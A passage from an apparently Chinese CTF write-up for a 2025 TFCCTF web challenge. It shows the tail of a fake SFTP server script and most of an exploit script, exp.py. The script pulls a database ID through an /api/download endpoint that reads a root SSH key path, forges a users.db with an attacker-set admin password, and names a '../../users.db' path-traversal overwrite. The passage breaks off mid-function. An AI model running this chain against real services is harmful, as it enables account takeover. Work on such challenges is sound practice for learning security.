</span></span><span class=line><span class=cl>            <span class=n>t</span><span class=o>.</span><span class=n>start_server</span><span class=p>(</span><span class=n>server</span><span class=o>=</span><span class=n>server</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] SSH negotiation failed:&#34;</span><span class=p>,</span> <span class=n>e</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>continue</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 挂载 SFTP 子系统</span>
</span></span><span class=line><span class=cl>        <span class=n>t</span><span class=o>.</span><span class=n>set_subsystem_handler</span><span class=p>(</span><span class=s2>&#34;sftp&#34;</span><span class=p>,</span> <span class=n>paramiko</span><span class=o>.</span><span class=n>SFTPServer</span><span class=p>,</span> <span class=n>SimpleSFTPHandler</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>os</span><span class=o>.</span><span class=n>makedirs</span><span class=p>(</span><span class=n>WORK_DIR</span><span class=p>,</span> <span class=n>exist_ok</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 测试文件</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>WORK_DIR</span><span class=p>,</span> <span class=s2>&#34;test.txt&#34;</span><span class=p>),</span> <span class=s2>&#34;w&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=s2>&#34;Hello from fake SFTP server</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>start_sftp_server</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>需要安装paramiko依赖</p><p>有点小bug, 要把事先准备好的users.db放在<code>/app/app/</code>目录下</p><p>然而直接覆盖users.db也不行, 题目对users.db进行了校验</p><p><img src=/img/2025-TFCCTF/13.png alt=1></p><p>依旧是ai生成脚本来修改获得恶意users.db, 使得它通过DB_id校验</p><p><code>message.py</code>如下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
</span><span class=lnt>172
</span><span class=lnt>173
</span><span class=lnt>174
</span><span class=lnt>175
</span><span class=lnt>176
</span><span class=lnt>177
</span><span class=lnt>178
</span><span class=lnt>179
</span><span class=lnt>180
</span><span class=lnt>181
</span><span class=lnt>182
</span><span class=lnt>183
</span><span class=lnt>184
</span><span class=lnt>185
</span><span class=lnt>186
</span><span class=lnt>187
</span><span class=lnt>188
</span><span class=lnt>189
</span><span class=lnt>190
</span><span class=lnt>191
</span><span class=lnt>192
</span><span class=lnt>193
</span><span class=lnt>194
</span><span class=lnt>195
</span><span class=lnt>196
</span><span class=lnt>197
</span><span class=lnt>198
</span><span class=lnt>199
</span><span class=lnt>200
</span><span class=lnt>201
</span><span class=lnt>202
</span><span class=lnt>203
</span><span class=lnt>204
</span><span class=lnt>205
</span><span class=lnt>206
</span><span class=lnt>207
</span><span class=lnt>208
</span><span class=lnt>209
</span><span class=lnt>210
</span><span class=lnt>211
</span><span class=lnt>212
</span><span class=lnt>213
</span><span class=lnt>214
</span><span class=lnt>215
</span><span class=lnt>216
</span><span class=lnt>217
</span><span class=lnt>218
</span><span class=lnt>219
</span><span class=lnt>220
</span><span class=lnt>221
</span><span class=lnt>222
</span><span class=lnt>223
</span><span class=lnt>224
</span><span class=lnt>225
</span><span class=lnt>226
</span><span class=lnt>227
</span><span class=lnt>228
</span><span class=lnt>229
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl><span class=c1># -*- coding: utf-8 -*-</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>基于目标 Next.js 服务的 /api/download 接口，提取数据库的 DB_ID，
</span></span></span><span class=line><span class=cl><span class=s2>并在本地生成一个包含管理员用户的 users.db（密码为可控明文，存储为 bcrypt 哈希）。
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>使用说明（示例）：
</span></span></span><span class=line><span class=cl><span class=s2>  python3 exp.py </span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s2>    --base-url http://localhost:3000 </span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s2>    --username admin </span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s2>    --password Admin@123 </span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s2>    --output ./users.db
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>注意：
</span></span></span><span class=line><span class=cl><span class=s2>- 本脚本不会尝试覆盖目标容器内的数据库，只负责在本地生成可用的 users.db。
</span></span></span><span class=line><span class=cl><span class=s2>- 后续可结合 SFTP 覆盖漏洞将该文件写回容器（例如利用 filename=&#34;../../users.db&#34;）。
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>__future__</span> <span class=kn>import</span> <span class=n>annotations</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>argparse</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>json</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sqlite3</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>urllib.request</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>urllib.error</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>typing</span> <span class=kn>import</span> <span class=n>Optional</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 在 Unix 系统上可用的标准库 bcrypt 实现接口（依赖底层 libxcrypt 对 $2b$ 支持）</span>
</span></span><span class=line><span class=cl><span class=c1># 优先使用 python-bcrypt（若用户已安装），否则回退到 crypt</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>bcrypt_hash</span><span class=p>(</span><span class=n>password</span><span class=p>:</span> <span class=nb>str</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>str</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;生成 bcrypt 哈希，优先使用 bcrypt 库，不存在则回退到 crypt（$2b$）。
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    参数:
</span></span></span><span class=line><span class=cl><span class=s2>        password: 明文口令
</span></span></span><span class=line><span class=cl><span class=s2>    返回:
</span></span></span><span class=line><span class=cl><span class=s2>        形如 $2b$10$... 的 bcrypt 哈希字符串
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=c1># 优先尝试第三方 bcrypt（如已安装）</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=kn>import</span> <span class=nn>bcrypt</span>  <span class=c1># type: ignore</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>hashed_bytes</span> <span class=o>=</span> <span class=n>bcrypt</span><span class=o>.</span><span class=n>hashpw</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=n>password</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s2>&#34;utf-8&#34;</span><span class=p>),</span> <span class=n>bcrypt</span><span class=o>.</span><span class=n>gensalt</span><span class=p>(</span><span class=n>rounds</span><span class=o>=</span><span class=mi>10</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>hashed_bytes</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s2>&#34;utf-8&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>pass</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 回退到 crypt（需系统支持 $2b$）</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=kn>import</span> <span class=nn>crypt</span>
</span></span><span class=line><span class=cl>        <span class=kn>import</span> <span class=nn>secrets</span>
</span></span><span class=line><span class=cl>        <span class=kn>import</span> <span class=nn>string</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>alphabet</span> <span class=o>=</span> <span class=s2>&#34;./&#34;</span> <span class=o>+</span> <span class=n>string</span><span class=o>.</span><span class=n>digits</span> <span class=o>+</span> <span class=n>string</span><span class=o>.</span><span class=n>ascii_uppercase</span> <span class=o>+</span> <span class=n>string</span><span class=o>.</span><span class=n>ascii_lowercase</span>
</span></span><span class=line><span class=cl>        <span class=n>salt22</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>secrets</span><span class=o>.</span><span class=n>choice</span><span class=p>(</span><span class=n>alphabet</span><span class=p>)</span> <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>22</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=n>salt</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;$2b$10$</span><span class=si>{</span><span class=n>salt22</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>        <span class=n>hashed</span> <span class=o>=</span> <span class=n>crypt</span><span class=o>.</span><span class=n>crypt</span><span class=p>(</span><span class=n>password</span><span class=p>,</span> <span class=n>salt</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=ow>not</span> <span class=n>hashed</span> <span class=ow>or</span> <span class=ow>not</span> <span class=n>hashed</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=s2>&#34;$2&#34;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>raise</span> <span class=ne>RuntimeError</span><span class=p>(</span><span class=s2>&#34;系统 crypt 不支持 bcrypt 算法 ($2b$)&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>hashed</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>exc</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>raise</span> <span class=ne>RuntimeError</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;无法生成 bcrypt 哈希：请安装 `pip install bcrypt` 或确保系统 crypt 支持 $2b$&#34;</span>
</span></span><span class=line><span class=cl>        <span class=p>)</span> <span class=kn>from</span> <span class=nn>exc</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>http_post_json</span><span class=p>(</span><span class=n>url</span><span class=p>:</span> <span class=nb>str</span><span class=p>,</span> <span class=n>payload</span><span class=p>:</span> <span class=nb>dict</span><span class=p>,</span> <span class=n>timeout</span><span class=p>:</span> <span class=nb>float</span> <span class=o>=</span> <span class=mf>15.0</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>dict</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;使用标准库发起 JSON POST 请求，返回解析后的 JSON 字典。
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    仅依赖 urllib，避免引入额外依赖。
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>json</span><span class=o>.</span><span class=n>dumps</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s2>&#34;utf-8&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>req</span> <span class=o>=</span> <span class=n>urllib</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>Request</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=n>url</span><span class=o>=</span><span class=n>url</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>headers</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;Content-Type&#34;</span><span class=p>:</span> <span class=s2>&#34;application/json&#34;</span><span class=p>},</span>
</span></span><span class=line><span class=cl>        <span class=n>method</span><span class=o>=</span><span class=s2>&#34;POST&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>with</span> <span class=n>urllib</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>urlopen</span><span class=p>(</span><span class=n>req</span><span class=p>,</span> <span class=n>timeout</span><span class=o>=</span><span class=n>timeout</span><span class=p>)</span> <span class=k>as</span> <span class=n>resp</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>text</span> <span class=o>=</span> <span class=n>resp</span><span class=o>.</span><span class=n>read</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s2>&#34;utf-8&#34;</span><span class=p>,</span> <span class=n>errors</span><span class=o>=</span><span class=s2>&#34;replace&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>json</span><span class=o>.</span><span class=n>loads</span><span class=p>(</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=n>urllib</span><span class=o>.</span><span class=n>error</span><span class=o>.</span><span class=n>HTTPError</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>body</span> <span class=o>=</span> <span class=n>e</span><span class=o>.</span><span class=n>read</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s2>&#34;utf-8&#34;</span><span class=p>,</span> <span class=n>errors</span><span class=o>=</span><span class=s2>&#34;replace&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>Exception</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>body</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=k>raise</span> <span class=ne>RuntimeError</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;HTTP </span><span class=si>{</span><span class=n>e</span><span class=o>.</span><span class=n>code</span><span class=si>}</span><span class=s2> </span><span class=si>{</span><span class=n>e</span><span class=o>.</span><span class=n>reason</span><span class=si>}</span><span class=s2>: </span><span class=si>{</span><span class=n>body</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span> <span class=kn>from</span> <span class=nn>e</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=n>urllib</span><span class=o>.</span><span class=n>error</span><span class=o>.</span><span class=n>URLError</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>raise</span> <span class=ne>RuntimeError</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;网络错误: </span><span class=si>{</span><span class=n>e</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span> <span class=kn>from</span> <span class=nn>e</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>extract_db_id_from_text</span><span class=p>(</span><span class=n>text</span><span class=p>:</span> <span class=nb>str</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=n>Optional</span><span class=p>[</span><span class=nb>str</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;从 /api/download 返回的文本内容中提取 32 位十六进制 DB_ID。
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    由于服务端以 utf-8 读取二进制 SQLite 文件，内容可能被破坏，但 &#39;db_id&#39; 与其值通常
</span></span></span><span class=line><span class=cl><span class=s2>    仍以明文出现。这里优先匹配 &#39;db_id&#39; 附近的 32 位 hex；若失败，回退为全局第一个 32 位 hex。
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=c1># 优先：锚定 &#39;db_id&#39; 关键字附近 0..128 字符内的 32 位十六进制</span>
</span></span><span class=line><span class=cl>    <span class=n>m</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>r</span><span class=s2>&#34;db_id[\s\S]{0,128}?([a-f0-9]</span><span class=si>{32}</span><span class=s2>)&#34;</span><span class=p>,</span> <span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>m</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>m</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># 回退：任意出现的 32 位十六进制</span>
</span></span><span class=line><span class=cl>    <span class=n>m</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>r</span><span class=s2>&#34;([a-f0-9]</span><span class=si>{32}</span><span class=s2>)&#34;</span><span class=p>,</span> <span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>m</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>m</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>fetch_db_id</span><span class=p>(</span><span class=n>base_url</span><span class=p>:</span> <span class=nb>str</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>str</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;调用 /api/download 下载 users.db，并从响应内容中提取 DB_ID。&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>url</span> <span class=o>=</span> <span class=n>base_url</span><span class=o>.</span><span class=n>rstrip</span><span class=p>(</span><span class=s2>&#34;/&#34;</span><span class=p>)</span> <span class=o>+</span> <span class=s2>&#34;/api/download&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;host&#34;</span><span class=p>:</span> <span class=s2>&#34;localhost&#34;</span><span class=p>,</span>         <span class=c1># 在容器内连向本机 sshd</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;filename&#34;</span><span class=p>:</span> <span class=s2>&#34;users.db&#34;</span><span class=p>,</span>      <span class=c1># 远端路径将解析为 /app/users.db</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;keyPath&#34;</span><span class=p>:</span> <span class=s2>&#34;/root/.ssh/id_rsa&#34;</span><span class=p>,</span>  <span class=c1># 容器内预置的私钥</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;downloadPath&#34;</span><span class=p>:</span> <span class=s2>&#34;/app/downloads/&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>resp</span> <span class=o>=</span> <span class=n>http_post_json</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=nb>isinstance</span><span class=p>(</span><span class=n>resp</span><span class=p>,</span> <span class=nb>dict</span><span class=p>)</span> <span class=ow>or</span> <span class=ow>not</span> <span class=n>resp</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;ok&#34;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>raise</span> <span class=ne>RuntimeError</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;下载 users.db 失败: </span><span class=si>{</span><span class=n>resp</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>content</span> <span class=o>=</span> <span class=n>resp</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;content&#34;</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=nb>isinstance</span><span class=p>(</span><span class=n>content</span><span class=p>,</span> <span class=nb>str</span><span class=p>)</span> <span class=ow>or</span> <span class=ow>not</span> <span class=n>content</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>raise</span> <span class=ne>RuntimeError</span><span class=p>(</span><span class=s2>&#34;下载结果无内容或类型异常&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>db_id</span> <span class=o>=</span> <span class=n>extract_db_id_from_text</span><span class=p>(</span><span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>db_id</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>raise</span> <span class=ne>RuntimeError</span><span class=p>(</span><span class=s2>&#34;未能从返回内容中解析出 DB_ID&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>db_id</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>forge_users_db</span><span class=p>(</span>
</span></span><span class=line><span class=cl>    <span class=n>output_path</span><span class=p>:</span> <span class=nb>str</span><span class=p>,</span> <span class=n>db_id</span><span class=p>:</span> <span class=nb>str</span><span class=p>,</span> <span class=n>admin_username</span><span class=p>:</span> <span class=nb>str</span><span class=p>,</span> <span class=n>admin_password_hash</span><span class=p>:</span> <span class=nb>str</span>
</span></span><span class=line><span class=cl><span class=p>)</span> <span class=o>-&gt;</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;生成符合目标服务结构的 users.db 并写入管理员。&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=c1># 确保输出目录存在</span>
</span></span><span class=line><span class=cl>    <span class=n>out_dir</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>dirname</span><span class=p>(</span><span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>abspath</span><span class=p>(</span><span class=n>output_path</span><span class=p>))</span> <span class=ow>or</span> <span class=s2>&#34;.&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>os</span><span class=o>.</span><span class=n>makedirs</span><span class=p>(</span><span class=n>out_dir</span><span class=p>,</span> <span class=n>exist_ok</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 若已存在，先删除避免旧结构干扰</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>exists</span><span class=p>(</span><span class=n>output_path</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>os</span><span class=o>.</span><span class=n>remove</span><span class=p>(</span><span class=n>output_path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>conn</span> <span class=o>=</span> <span class=n>sqlite3</span><span class=o>.</span><span class=n>connect</span><span class=p>(</span><span class=n>output_path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>cur</span> <span class=o>=</span> <span class=n>conn</span><span class=o>.</span><span class=n>cursor</span><span class=p>()</span>
